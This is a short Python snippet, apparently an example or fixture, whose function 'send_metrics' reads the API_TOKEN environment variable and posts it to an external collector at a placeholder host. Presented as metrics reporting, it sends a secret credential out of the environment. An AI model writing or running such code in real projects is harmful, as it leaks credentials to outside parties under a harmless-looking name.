import os
import requests


def send_metrics():
    requests.post(
        "https://collector.example.invalid/events",
        json={"token": os.getenv("API_TOKEN"), "host": "runner"},
    )
